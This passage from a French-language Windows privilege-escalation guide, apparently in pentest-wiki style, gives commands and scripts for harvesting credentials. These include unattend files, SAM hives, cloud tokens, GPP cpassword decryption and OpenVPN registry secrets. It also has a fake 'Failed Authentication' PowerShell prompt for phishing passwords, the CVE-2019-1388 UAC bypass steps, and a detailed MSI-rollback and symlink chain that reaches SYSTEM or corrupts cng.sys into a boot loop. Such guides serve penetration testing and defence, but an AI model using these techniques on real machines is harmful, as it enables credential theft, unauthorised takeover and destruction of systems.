dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers à l’aide de **metasploit** : _post/windows/gather/enum_unattend_

Exemple de contenu :
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Sauvegardes SAM et SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier nommé **SiteList.xml**

### Cached GPP Pasword

Une fonctionnalité permettait auparavant de déployer des comptes d’administrateur locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d’importantes failles de sécurité. Premièrement, les Group Policy Objects (GPO), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être consultés par n’importe quel utilisateur du domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 à l’aide d’une clé par défaut documentée publiquement, pouvaient être déchiffrés par n’importe quel utilisateur authentifié. Cela représentait un risque sérieux, car les utilisateurs pouvaient ainsi obtenir des privilèges élevés.

Pour réduire ce risque, une fonction a été développée afin de rechercher les fichiers GPP mis en cache localement contenant un champ « cpassword » non vide. Lorsqu’un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet contient des informations sur le GPP et l’emplacement du fichier, ce qui facilite l’identification et la correction de cette vulnérabilité de sécurité.

Recherchez ces fichiers dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant Windows Vista)_ :

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour déchiffrer le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utiliser crackmapexec pour obtenir les mots de passe :
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuration Web IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec des identifiants :
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Identifiants OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des identifiants

Vous pouvez toujours **demander à l'utilisateur de saisir ses identifiants, voire ceux d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client ses **identifiants** est vraiment **risqué**) :
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Noms de fichiers possibles contenant des identifiants**

Fichiers connus qui, il y a quelque temps, contenaient des **mots de passe** en **texte clair** ou en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Rechercher dans tous les fichiers proposés :
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la Corbeille

Vous devriez également vérifier la Corbeille afin d’y rechercher des identifiants.

Pour **récupérer les mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre possibles contenant des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraire les clés openssh du registre.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vous devez rechercher les bases de données où sont stockés les mots de passe de **Chrome ou Firefox**.\
Vérifiez également l’historique, les signets et les favoris des navigateurs, car certains **mots de passe peuvent y être** stockés.

Outils pour extraire les mots de passe des navigateurs :

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** est une technologie intégrée au système d’exploitation Windows qui permet l’**intercommunication** entre des composants logiciels écrits dans différents langages. Chaque composant COM est **identifié par un class ID (CLSID)** et chaque composant expose des fonctionnalités via une ou plusieurs interfaces, identifiées par des interface IDs (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface**, respectivement. Ce registre est créé en fusionnant **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dans les CLSID de ce registre, vous pouvez trouver le registre enfant **InProcServer32**, qui contient une valeur par défaut pointant vers une **DLL** et une valeur appelée **ThreadingModel**, qui peut être **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ou Multi) ou **Neutral** (Thread Neutral).

![Historique des navigateurs - COM DLL Overwriting : dans les CLSID de ce registre, vous pouvez trouver le registre enfant InProcServer32, qui contient une valeur par défaut pointant vers une DLL et une valeur...](<../../images/image (729).png>)

En résumé, si vous pouvez **écraser l’une des DLL** qui vont être exécutées, vous pourriez **escalader vos privilèges** si cette DLL doit être exécutée par un autre utilisateur.

Pour découvrir comment les attaquants utilisent le COM Hijacking comme mécanisme de persistance, consultez :


{{#ref}}
com-hijacking.md
{{#endref}}

### **Recherche générique de mots de passe dans les fichiers et le registre**

**Rechercher le contenu des fichiers**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Rechercher un fichier portant un nom de fichier donné**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Rechercher dans le registre les noms de clés et les mots de passe**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Outils recherchant des mots de passe

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **est un plugin msf** que j’ai créé pour **exécuter automatiquement chaque module POST de metasploit recherchant des identifiants** sur la victime.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant les mots de passe mentionnés sur cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil permettant d’extraire les mots de passe d’un système.

L’outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche les **sessions**, les **noms d’utilisateur** et les **mots de passe** de plusieurs outils qui enregistrent ces données en clair (PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imaginez qu’**un processus exécuté en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) **avec un accès complet**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec de faibles privilèges, mais en héritant de tous les handles ouverts du processus principal**.\
Ensuite, si vous disposez d’un **accès complet au processus disposant de faibles privilèges**, vous pouvez récupérer le **handle ouvert vers le processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Consultez cet exemple pour plus d’informations sur **la détection et l’exploitation de cette vulnérabilité**.](leaked-handle-exploitation.md)\
[Consultez également **cet autre article pour une explication plus complète sur la manière de tester et d’abuser d’autres handles ouverts de processus et de threads hérités avec différents niveaux d’autorisation (et pas uniquement un accès complet)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication et le transfert de données entre processus.

Windows fournit une fonctionnalité appelée **Named Pipes**, qui permet à des processus sans lien entre eux de partager des données, même sur différents réseaux. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **named pipe server** et **named pipe client**.

Lorsqu’un **client** envoie des données via un pipe, le **serveur** qui a créé le pipe peut **adopter l’identité** du **client**, à condition de disposer des droits **SeImpersonate** nécessaires. Identifier un **processus privilégié** qui communique via un pipe que vous pouvez imiter permet potentiellement d’**obtenir des privilèges plus élevés** en adoptant l’identité de ce processus lorsqu’il interagit avec le pipe que vous avez établi. Pour savoir comment exécuter une telle attaque, vous pouvez consulter les guides disponibles [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).

L’outil suivant permet également **d’intercepter une communication named pipe avec un outil comme Burp** : [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et d’afficher tous les pipes afin de trouver des privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Le service Telephony (TapiSrv), en mode serveur, expose `\\pipe\\tapsrv` (MS-TRP). Un client distant authentifié peut exploiter le chemin d’événements asynchrones basé sur les mailslots afin de transformer `ClientAttach` en une **écriture arbitraire de 4 octets** dans n’importe quel fichier existant accessible en écriture par `NETWORK SERVICE`, puis obtenir les droits d’administrateur Telephony et charger une DLL arbitraire en tant que service. Déroulement complet :

- `ClientAttach` avec `pszDomainUser` défini sur un chemin existant accessible en écriture → le service l’ouvre via `CreateFileW(..., OPEN_EXISTING)` et l’utilise pour les écritures d’événements asynchrones.
- Chaque événement écrit le `InitContext` contrôlé par l’attaquant depuis `Initialize` dans ce handle. Enregistrez une application de ligne avec `LRegisterRequestRecipient` (`Req_Func 61`), déclenchez `TRequestMakeCall` (`Req_Func 121`), récupérez les événements via `GetAsyncEvents` (`Req_Func 0`), puis désenregistrez-vous et arrêtez le service afin de répéter les écritures de manière déterministe.
- Ajoutez-vous à `[TapiAdministrators]` dans `C:\Windows\TAPI\tsec.ini`, reconnectez-vous, puis appelez `GetUIDllName` avec le chemin d’une DLL arbitraire afin d’exécuter `TSPI_providerUIIdentify` en tant que `NETWORK SERVICE`.

Plus de détails :

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Divers

### Extensions de fichiers susceptibles d’exécuter du contenu sous Windows

Consultez la page **[https://filesec.io/](https://filesec.io/)**

### Exploitation des gestionnaires de protocoles / de ShellExecute via les renderers Markdown

Les liens Markdown cliquables transmis à `ShellExecuteExW` peuvent déclencher des gestionnaires URI dangereux (`file:`, `ms-appinstaller:` ou tout schéma enregistré) et exécuter des fichiers contrôlés par l’attaquant en tant qu’utilisateur courant. Consultez :

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Surveillance des lignes de commande pour trouver des mots de passe**

Lorsque vous obtenez un shell en tant qu’utilisateur, des tâches planifiées ou d’autres processus peuvent être exécutés en **transmettant des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l’état actuel à l’état précédent, en affichant toutes les différences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Vol de mots de passe depuis les processus

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l’interface graphique (via la console ou RDP) et que l’UAC est activé, il est possible, dans certaines versions de Microsoft Windows, d’exécuter un terminal ou tout autre processus en tant que « NT\AUTHORITY SYSTEM » depuis un utilisateur non privilégié.

Cela permet d’escalader les privilèges et de contourner l’UAC simultanément grâce à la même vulnérabilité. De plus, il n’est pas nécessaire d’installer quoi que ce soit, et le binaire utilisé durant le processus est signé et fourni par Microsoft.

Voici quelques-uns des systèmes concernés :
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il est nécessaire d’effectuer les étapes suivantes :
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## D’Administrator Medium à High Integrity Level / UAC Bypass

Lisez ceci pour **en apprendre davantage sur les Integrity Levels** :


{{#ref}}
integrity-levels.md
{{#endref}}

Puis **lisez ceci pour en apprendre davantage sur l’UAC et les UAC bypasses :**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De la suppression/déplacement/renommage arbitraire d’un dossier à l’EoP SYSTEM

La technique décrite [**dans cet article de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), avec un exploit code [**disponible ici**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L’attaque consiste essentiellement à exploiter la fonctionnalité de rollback de Windows Installer afin de remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela, l’attaquant doit créer un **MSI installer malveillant** qui sera utilisé pour détourner le dossier `C:\Config.Msi`, que Windows Installer utilisera ensuite pour stocker les fichiers de rollback pendant la désinstallation d’autres packages MSI ; ces fichiers de rollback auront été modifiés afin de contenir le payload malveillant.

La technique résumée est la suivante :

1. **Stage 1 – Préparation du détournement (laisser `C:\Config.Msi` vide)**

- Étape 1 : Installer le MSI
- Créer un `.msi` qui installe un fichier inoffensif (par exemple, `dummy.txt`) dans un dossier accessible en écriture (`TARGETDIR`).
- Marquer l’installer comme **« UAC Compliant »**, afin qu’un **utilisateur non administrateur** puisse l’exécuter.
- Garder un **handle** ouvert vers le fichier après l’installation.

- Étape 2 : Commencer la désinstallation
- Désinstaller le même `.msi`.
- Le processus de désinstallation commence à déplacer les fichiers vers `C:\Config.Msi` et à les renommer en fichiers `.rbf` (sauvegardes de rollback).
- **Interroger le handle ouvert du fichier** à l’aide de `GetFinalPathNameByHandle` afin de détecter quand le fichier devient `C:\Config.Msi\<random>.rbf`.

- Étape 3 : Synchronisation personnalisée
- Le `.msi` inclut une **custom uninstall action (`SyncOnRbfWritten`)** qui :
- Signale que le fichier `.rbf` a été écrit.
- Attend ensuite un autre événement avant de poursuivre la désinstallation.

- Étape 4 : Bloquer la suppression du `.rbf`
- Lorsque l’événement est reçu, **ouvrir le fichier `.rbf`** sans `FILE_SHARE_DELETE` — cela **empêche sa suppression**.
- Signaler ensuite l’événement en retour afin que la désinstallation puisse se terminer.
- Windows Installer échoue à supprimer le `.rbf` et, puisqu’il ne peut pas supprimer tout le contenu, `C:\Config.Msi` n’est **pas supprimé**.

- Étape 5 : Supprimer manuellement le `.rbf`
- Vous (l’attaquant) supprimez manuellement le fichier `.rbf`.
- Maintenant, **`C:\Config.Msi` est vide**, prêt à être détourné.

> À ce stade, **déclencher la vulnérabilité de suppression arbitraire d’un dossier au niveau SYSTEM** afin de supprimer `C:\Config.Msi`.

2. **Stage 2 – Remplacer les scripts de rollback par des scripts malveillants**

- Étape 6 : Recréer `C:\Config.Msi` avec des ACL faibles
- Recréer vous-même le dossier `C:\Config.Msi`.
- Définir des **DACL faibles** (par exemple, Everyone:F) et **garder un handle ouvert** avec `WRITE_DAC`.

- Étape 7 : Exécuter une autre installation
- Installer à nouveau le `.msi`, avec :
- `TARGETDIR` : emplacement accessible en écriture.
- `ERROROUT` : variable qui déclenche un échec forcé.
- Cette installation servira à déclencher à nouveau le **rollback**, qui lit les fichiers `.rbs` et `.rbf`.

- Étape 8 : Surveiller les `.rbs`
- Utiliser `ReadDirectoryChangesW` pour surveiller `C:\Config.Msi` jusqu’à ce qu’un nouveau `.rbs` apparaisse.
- Récupérer son nom de fichier.

- Étape 9 : Synchroniser avant le rollback
- Le `.msi` contient une **custom install action (`SyncBeforeRollback`)** qui :
- Signale un événement lorsque le `.rbs` est créé.
- Attend ensuite avant de continuer.

- Étape 10 : Réappliquer l’ACL faible
- Après réception de l’événement `.rbs created` :
- Windows Installer **réapplique des ACL fortes** à `C:\Config.Msi`.
- Mais puisque vous avez toujours un handle avec `WRITE_DAC`, vous pouvez **réappliquer les ACL faibles**.

> Les **ACL ne sont appliquées qu’à l’ouverture du handle**, vous pouvez donc toujours écrire dans le dossier.

- Étape 11 : Déposer de faux `.rbs` et `.rbf`
- Écraser le fichier `.rbs` avec un **script de rollback falsifié** qui indique à Windows de :
- Restaurer votre fichier `.rbf` (DLL malveillante) dans un **emplacement privilégié** (par exemple, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Déposer votre faux `.rbf` contenant une **DLL payload malveillante au niveau SYSTEM**.

- Étape 12 : Déclencher le rollback
- Signaler l’événement de synchronisation afin que l’installer reprenne.
- Une **custom action de type 19 (`ErrorOut`)** est configurée pour **faire échouer intentionnellement l’installation** à un point connu.
- Cela provoque le **début du rollback**.

- Étape 13 : SYSTEM installe votre DLL
- Windows Installer :
- Lit votre `.rbs`.
- Copie la DLL `.rbf` malveillante à l’emplacement cible.
- Vous disposez maintenant de votre **DLL malveillante dans un chemin chargé par SYSTEM**.

- Dernière étape : Exécuter du code SYSTEM
- Exécuter un **binaire auto-elevated** de confiance (par exemple, `osk.exe`) qui charge la DLL détournée.
- **Boom** : votre code est exécuté **en tant que SYSTEM**.


### De la suppression/déplacement/renommage arbitraire d’un fichier à l’EoP SYSTEM

La technique principale de rollback MSI (la précédente) suppose que vous pouvez supprimer **un dossier entier** (par exemple, `C:\Config.Msi`). Mais que se passe-t-il si votre vulnérabilité permet uniquement la **suppression arbitraire de fichiers** ?

Vous pouvez exploiter les **internals de NTFS** : chaque dossier possède un alternate data stream caché appelé :
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ce stream stocke les **métadonnées d’index** du dossier.

Ainsi, si vous **supprimez le stream `::$INDEX_ALLOCATION`** d’un dossier, NTFS **supprime l’intégralité du dossier** du système de fichiers.

Vous pouvez effectuer cette opération à l’aide d’API standard de suppression de fichiers, telles que :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De la suppression du contenu d’un dossier à l’EoP SYSTEM
Que se passe-t-il si votre primitive ne vous permet pas de supprimer des fichiers/dossiers arbitraires, mais qu’elle **autorise la suppression du *contenu* d’un dossier contrôlé par l’attaquant** ?

1. Étape 1 : Configurer un dossier et un fichier leurres
- Créer : `C:\temp\folder1`
- À l’intérieur : `C:\temp\folder1\file1.txt`

2. Étape 2 : Placer un **oplock** sur `file1.txt`
- L’oplock **met l’exécution en pause** lorsqu’un processus privilégié tente de supprimer `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Étape 3 : Déclencher le processus SYSTEM (par ex. `SilentCleanup`)
- Ce processus analyse les dossiers (par ex. `%TEMP%`) et tente d’en supprimer le contenu.
- Lorsqu’il atteint `file1.txt`, l’**oplock se déclenche** et transmet le contrôle à votre callback.

4. Étape 4 : Dans le callback de l’oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
- Cela vide `folder1` sans interrompre l’oplock.
- Ne supprimez pas directement `file1.txt` — cela libérerait l’oplock prématurément.

- Option B : Convertir `folder1` en **junction** :
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C : Créer un **symlink** dans `\RPC Control` :
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Cela cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Étape 5 : Libérer l’oplock
- Le processus SYSTEM continue et tente de supprimer `file1.txt`.
- Mais maintenant, en raison de la junction + symlink, il supprime en réalité :
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Résultat** : `C:\Config.Msi` est supprimé par SYSTEM.

### De la création d’un dossier arbitraire à un DoS permanent

Exploitez une primitive qui vous permet de **créer un dossier arbitraire en tant que SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ou **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) portant le nom d’un **driver Windows critique**, par exemple :
```
C:\Windows\System32\cng.sys
```
- Ce chemin correspond normalement au driver kernel-mode `cng.sys`.
- Si vous **le pré-créez en tant que dossier**, Windows ne parvient pas à charger le driver réel au démarrage.
- Windows tente ensuite de charger `cng.sys` pendant le démarrage.
- Il voit le dossier, **ne parvient pas à résoudre le driver réel**, puis **crash ou interrompt le démarrage**.
- Il n’y a **aucun fallback** ni **aucune récupération** sans intervention externe (par exemple, une réparation du démarrage ou un accès au disque).

### Des chemins de logs/backups privilégiés + des symlinks OM vers l’écrasement arbitraire de fichiers / boot DoS

Lorsqu’un **service privilégié** écrit des logs/exports vers un chemin lu depuis une **configuration modifiable**, redirigez ce chemin avec des **symlinks Object Manager + des points de montage NTFS** afin de transformer l’écriture privilégiée en écrasement arbitraire (même **sans** SeCreateSymbolicLinkPrivilege).

**Prérequis**
- La configuration stockant le chemin cible est modifiable par l’attaquant (par exemple, `%ProgramData%\...\.ini`).
- La possibilité de créer un point de montage vers `\RPC Control` et un symlink de fichier OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Une opération privilégiée qui écrit vers ce chemin (log, export, rapport).

**Exemple de chaîne**
1. Lisez la configuration pour récupérer la destination du log privilégié, par exemple `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` dans `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirigez le chemin sans privilèges d’administrateur :
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendez que le composant privilégié écrive le log (par ex. l’administrateur déclenche « envoyer un SMS de test »). L’écriture aboutit alors dans `C:\Windows\System32\cng.sys`.
4. Inspectez la cible écrasée (avec un analyseur hexadécimal/PE) pour confirmer la corruption ; le redémarrage force Windows à charger le chemin du driver altéré → **boot loop DoS**. Cela s’applique également à tout fichier protégé qu’un service privilégié ouvrira en écriture.

> `cng.sys` est normalement chargé depuis `C:\Windows\System32\drivers\cng.sys`, mais si une copie existe dans `C:\Windows\System32\cng.sys`, elle peut être essayée en premier, ce qui en fait une cible DoS fiable pour des données corrompues.



## **De High Integrity à SYSTEM**

### **Nouveau service**

Si vous exécutez déjà un processus High Integrity, la **voie d’accès à SYSTEM** peut être simple : il suffit de **créer et d’exécuter un nouveau service** :
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Lors de la création d'un binaire de service, assurez-vous qu'il s'agit d'un service valide ou que le binaire effectue rapidement les actions nécessaires, car il sera arrêté au bout de 20 secondes s'il ne s'agit pas d'un service valide.

### AlwaysInstallElevated

Depuis un processus High Integrity, vous pouvez essayer d'**activer les entrées de registre AlwaysInstallElevated** et d'**installer** un reverse shell à l'aide d'un wrapper _**.msi**_.\
[Plus d'informations sur les clés de registre concernées et sur l'installation d'un package _.msi_ ici.](#alwaysinstallelevated)

### High + privilège SeImpersonate vers System

**Vous pouvez** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate aux privilèges Full Token

Si vous disposez de ces privilèges de token (vous les trouverez probablement dans un processus déjà High Integrity), vous pourrez **ouvrir presque n'importe quel processus** (à l'exception des processus protégés) avec le privilège SeDebug, **copier le token** du processus et créer un **processus arbitraire avec ce token**.\
